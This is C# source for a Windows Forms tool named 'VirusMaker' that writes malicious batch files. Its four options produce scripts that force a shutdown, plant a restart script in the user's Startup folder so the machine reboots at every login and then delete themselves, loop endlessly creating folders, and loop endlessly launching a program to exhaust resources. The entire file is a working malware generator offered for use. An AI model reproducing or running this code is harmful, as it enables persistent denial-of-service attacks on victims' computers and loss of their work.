using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
namespace VirusMaker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            b.Location = new Point(398, 187);
            b.Size = new Size(252, 44);
            b.Text = "Create";
            b.Font = new Font("Microsoft Sans Serif", 18, FontStyle.Bold);
            b.BackColor = Color.Red;
            b.ForeColor = Color.Black;
            b.FlatStyle = FlatStyle.Flat;
            b.Click += new EventHandler(work);
            l.Text = "Time:";
            l.Location = new Point(396, 148);
            l.Size = new Size(75, 29);
            l.Font = new Font("Microsoft Sans Serif", 18, FontStyle.Bold);
            l.ForeColor = Color.Red;
            n.Maximum = 1000;
            n.Size = new Size(70, 35);
            n.Location = new Point(477, 146);
            n.BackColor = Color.Red;
            n.Font = new Font("Microsoft Sans Serif", 18, FontStyle.Bold);
            l1.Text = "Second";
            l1.ForeColor = Color.Red;
            l1.Size = new Size(102, 29);
            l1.Location = new Point(554, 148);
            l1.Font = new Font("Microsoft Sans Serif", 18, FontStyle.Bold);
            l2.Text = "Folder name:";
            l2.Size = new Size(168, 29);
            l2.Location = new Point(327, 127);
            l2.Font = new Font("Microsoft Sans Serif", 18, FontStyle.Bold);
            l2.ForeColor = Color.Red;
            t.Location = new Point(489, 128);
            t.Size = new Size(195, 28);
            t.Font = new Font("Microsoft Sans Serif", 18);
            t.BorderStyle = BorderStyle.None;
            t.BackColor = Color.Red;
        }
        public static Button b = new Button();
        public static Label l = new Label();
        public static Label l1 = new Label();
        public static NumericUpDown n = new NumericUpDown();
        public static Label l2 = new Label();
        public static TextBox t = new TextBox();
        private void button1_Click(object sender, EventArgs e)
        {
            button1.BackColor = Color.Black;
            button1.ForeColor = Color.Red;
            button2.BackColor = Color.Red;
            button2.ForeColor = Color.Black;
            button3.BackColor = Color.Red;
            button3.ForeColor = Color.Black;
            button4.BackColor = Color.Red;
            button4.ForeColor = Color.Black;
            b.Name = "1";
            l1.Text = "Second";
            this.Controls.Remove(t);
            this.Controls.Add(l1);
            this.Controls.Add(n);
            this.Controls.Add(b);
            this.Controls.Add(l);
            this.Controls.Remove(l2);
        }
        private static void work(object sender, EventArgs e)
        {
            Button b = sender as Button;
            if (b.Name == "1")
            {
                SaveFileDialog s = new SaveFileDialog();
                s.Title = "save Virus";
                s.Filter = "Bat File | *.bat";
                s.ShowDialog();
                try
                {
                    var f = File.Create(s.FileName);
                    f.Close();
                    string[] code = new string[2];
                    code[0] = "@echo off";
                    code[1] = "shutdown /s /t " + n.Value;
                    File.WriteAllLines(s.FileName, code);
                }
                catch (Exception ee)
                {
                    MessageBox.Show(ee.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            else if (b.Name == "2")
            {
                SaveFileDialog s1 = new SaveFileDialog();
                s1.Title = "Save Virus";
                s1.Filter = "Bat File | *.bat";
                s1.ShowDialog();
                try
                {
                    var f1 = File.Create(s1.FileName);
                    f1.Close();
                    string[] code = new string[7];
                    code[0] = "@echo off";
                    code[1] = "echo  @echo off >> system.bat";
                    code[2] = "echo shutdown.exe /r /t " + n.Value + " >> system.bat";
                    char c = '"';
                    code[3] = "xcopy system.bat " + c + @"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" + c;
                    code[4] = "del system.bat";
                    code[5] = "shutdown.exe /r /t " + n.Value;
                    string p = Path.GetFileName(s1.FileName);
                    code[6] = "del " + p;
                    File.WriteAllLines(s1.FileName, code);
                }
                catch (Exception ee)
                {
                    MessageBox.Show(ee.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            else if (b.Name == "3")
            {
                SaveFileDialog s2 = new SaveFileDialog();
                s2.Title = "Save Virus";
                s2.Filter = "Bar File|*.bat";
                s2.ShowDialog();
                try
                {
                    var f = File.Create(s2.FileName);
                    f.Close();
                    string[] code = new string[4];
                    code[0] = "@echo off";
                    code[1] = ":a";
                    code[2] = "mkdir "+t.Text+"%random%";
                    code[3] = "goto a";
                    File.WriteAllLines(s2.FileName, code);
                }
                catch (Exception ee)
                {
                    MessageBox.Show(ee.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }else if(b.Name == "4")
            {
                SaveFileDialog s3 = new SaveFileDialog();
                s3.Title = "Save Virus";
                s3.Filter = "Bat File|*.bat";
                s3.ShowDialog();
                try
                {
                    var f = File.Create(s3.FileName);
                    f.Close();
                    string[] code = new string[4];
                    code[0] = "@echo off";
                    code[1] = ":a";
                    code[2] = "start " + t.Text;
                    code[3] = "goto a";
                    File.WriteAllLines(s3.FileName, code);
                }
                catch (Exception ee)
                {
                    MessageBox.Show(ee.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }
        private void button2_Click_1(object sender, EventArgs e)
        {
            button2.BackColor = Color.Black;
            button2.ForeColor = Color.Red;
            button3.BackColor = Color.Red;
            button3.ForeColor = Color.Black;
            button4.BackColor = Color.Red;
            button4.ForeColor = Color.Black;
            button1.BackColor = Color.Red;
            button1.ForeColor = Color.Black;
            b.Name = "2";
            l1.Text = "Second";
            this.Controls.Remove(t);
            this.Controls.Add(l1);
            this.Controls.Add(n);
            this.Controls.Add(b);
            this.Controls.Add(l);
            this.Controls.Remove(l2);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            button3.BackColor = Color.Black;
            button3.ForeColor = Color.Red;
            button2.BackColor = Color.Red;
            button2.ForeColor = Color.Black;
            button4.BackColor = Color.Red;
            button4.ForeColor = Color.Black;
            button1.BackColor = Color.Red;
            button1.ForeColor = Color.Black;
            t.Text = "";
            b.Name = "3";
            l2.Text = "Folder name:";
            this.Controls.Add(t);
            this.Controls.Add(l2);
            this.Controls.Remove(l1);
            this.Controls.Remove(n);
            this.Controls.Add(b);
            this.Controls.Remove(l);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            button4.BackColor = Color.Black;
            button4.ForeColor = Color.Red;
            button2.BackColor = Color.Red;
            button2.ForeColor = Color.Black;
            button3.BackColor = Color.Red;
            button3.ForeColor = Color.Black;
            button1.BackColor = Color.Red;
            button1.ForeColor = Color.Black;
            t.Text = "";
            b.Name = "4";
            l2.Text = "file name :";
            this.Controls.Add(t);
            this.Controls.Add(l2);
            this.Controls.Remove(l1);
            this.Controls.Remove(n);
            this.Controls.Add(b);
            this.Controls.Remove(l);
        }
    }
}